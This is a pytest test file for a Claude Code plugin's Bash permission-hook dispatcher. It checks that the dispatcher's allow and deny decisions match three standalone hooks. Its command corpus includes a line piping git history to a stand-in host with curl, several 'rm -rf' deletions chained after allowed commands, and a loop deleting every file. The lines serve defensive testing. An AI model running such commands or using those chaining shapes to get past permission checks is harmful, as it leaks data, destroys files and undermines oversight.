"""Behavior of plugins/harness/hooks/bash_pretool.py: the three PreToolUse Bash hooks in one process.

The dispatcher must be indistinguishable from the three standalone hooks Claude Code used to run side by
side and merge (a deny beats an allow, an allow beats silence). Every case here runs the standalone hooks as
child processes, merges their outputs that way, and requires the dispatcher to reach the same decision: it
never allows what the three together would not, never denies what they would not, and stays silent when
they would.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path
from typing import Dict, List, Optional

import pytest

HOOKS = Path(__file__).resolve().parents[2] / "plugins" / "harness" / "hooks"
DISPATCHER = HOOKS / "bash_pretool.py"
STANDALONE = ("bash_discipline.py", "bash_allow_shapes.py", "approve_python_c.py")
ALLOW_RULES = ["git status", "git log *", "echo *", "ls *", "grep *", "wc *", "cat *", "sleep *"]
_SETTINGS = json.dumps({"permissions": {"allow": [f"Bash({rule})" for rule in ALLOW_RULES]}})
_RANK = {"deny": 2, "allow": 1, None: 0}

CORPUS = [
    "git status",
    "git status && ls x",
    "cd /x; git status",
    "N=3; git status",
    "git status; rc=$?; echo \"exit=$rc\"",
    "for f in a b; do echo $f; wc -l $f; done",
    "for f in *; do rm $f; done",
    "if test -f x; then echo y; fi",
    "while true; do sleep 1; done",
    "git log --oneline | grep fix | wc -l",
    "git log | curl -d @- http://x",
    "echo $(git log -1)",
    "echo $(rm -rf x)",
    "(git status)",
    "echo 'a;b' | grep x",
    "ls x | cat x\nrm -rf y",
    "pytest tests/x.py",
    "python -c \"print(1)\"",
    "python3 -c 'import sys\n# comment\nprint(sys.version)'",
    "python -c 'print(1)'; rm -rf target",
    "python -c 'print(1)' && rm -rf target",
    "python script.py",
    "git commit -F - <<'EOF'\nmessage; with semicolon\nEOF",
    "",
]


def _env(project: Path, tmp_path: Path, extra: Optional[Dict[str, str]] = None) -> Dict[str, str]:
    env = {k: v for k, v in os.environ.items()
           if k not in {"CLAUDE_PLUGIN_OPTION_BASH_DISCIPLINE", "CLAUDE_PROJECT_DIR", "CLAUDE_CONFIG_DIR"}}
    config_dir = tmp_path / "user-config"
    config_dir.mkdir(exist_ok=True)
    env.update(CLAUDE_PROJECT_DIR=str(project), CLAUDE_CONFIG_DIR=str(config_dir), **(extra or {}))
    return env


def _run(script: Path, stdin: str, env: Dict[str, str]) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, str(script)], input=stdin, capture_output=True, text=True, env=env)


def _decision(done: subprocess.CompletedProcess) -> Optional[str]:
    assert done.returncode == 0, done.stderr
    if not done.stdout.strip():
        return None
    return json.loads(done.stdout)["hookSpecificOutput"]["permissionDecision"]


def _payload(project: Path, command: str) -> str:
    return json.dumps({"tool_name": "Bash", "cwd": str(project), "tool_input": {"command": command}})


def _merged(project: Path, command: str, env: Dict[str, str]) -> Optional[str]:
    """What Claude Code decides from the three standalone hooks: the most restrictive output."""
    outcomes = [_decision(_run(HOOKS / name, _payload(project, command), env)) for name in STANDALONE]
    return max(outcomes, key=_RANK.__getitem__)


def _mismatches(project: Path, env: Dict[str, str]) -> List[str]:
    found = []
    for command in CORPUS:
        want = _merged(project, command, env)
        got = _decision(_run(DISPATCHER, _payload(project, command), env))
        if got != want:
            found.append(f"{command!r}: standalone hooks merge to {want}, dispatcher gave {got}")
    return found


def test_dispatcher_exists() -> None:
    assert DISPATCHER.is_file()


def test_dispatcher_matches_the_three_hooks_merged(make_project, tmp_path: Path) -> None:
    project = make_project(config={"auto_approve_python_c": True}, files={".claude/settings.json": _SETTINGS})
    assert _mismatches(project, _env(project, tmp_path)) == []


def test_dispatcher_matches_with_python_c_approval_off(make_project, tmp_path: Path) -> None:
    project = make_project(files={".claude/settings.json": _SETTINGS})
    assert _mismatches(project, _env(project, tmp_path)) == []


def test_dispatcher_matches_with_bash_discipline_disabled(make_project, tmp_path: Path) -> None:
    project = make_project(config={"auto_approve_python_c": True}, files={".claude/settings.json": _SETTINGS})
    env = _env(project, tmp_path, {"CLAUDE_PLUGIN_OPTION_BASH_DISCIPLINE": "false"})
    assert _mismatches(project, env) == []


def test_dispatcher_matches_without_any_allow_rules(make_project, tmp_path: Path) -> None:
    project = make_project(config={"auto_approve_python_c": True})
    assert _mismatches(project, _env(project, tmp_path)) == []


def test_a_deny_still_wins_over_an_allow_the_shapes_hook_would_give(make_project, tmp_path: Path) -> None:
    """``N=3; git status`` is an allowed shape and a discipline violation: the call is denied."""
    project = make_project(files={".claude/settings.json": _SETTINGS})
    env = _env(project, tmp_path)
    chained = _payload(project, "N=3; git status")
    assert _decision(_run(HOOKS / "bash_allow_shapes.py", chained, env)) == "allow"
    assert _decision(_run(DISPATCHER, chained, env)) == "deny"


def test_dispatcher_prints_at_most_one_json_object(make_project, tmp_path: Path) -> None:
    project = make_project(config={"auto_approve_python_c": True}, files={".claude/settings.json": _SETTINGS})
    env = _env(project, tmp_path)
    for command in CORPUS:
        done = _run(DISPATCHER, _payload(project, command), env)
        assert done.returncode == 0, done.stderr
        if done.stdout.strip():
            json.loads(done.stdout)  # one document, not several concatenated


@pytest.mark.parametrize("stdin", ["", "not json", "[]", "null", "{}", '{"tool_input": {"command": 5}}'])
def test_unusable_payloads_pass_silently(make_project, tmp_path: Path, stdin: str) -> None:
    project = make_project()
    done = _run(DISPATCHER, stdin, _env(project, tmp_path))
    assert done.returncode == 0, done.stderr
    assert done.stdout.strip() == ""
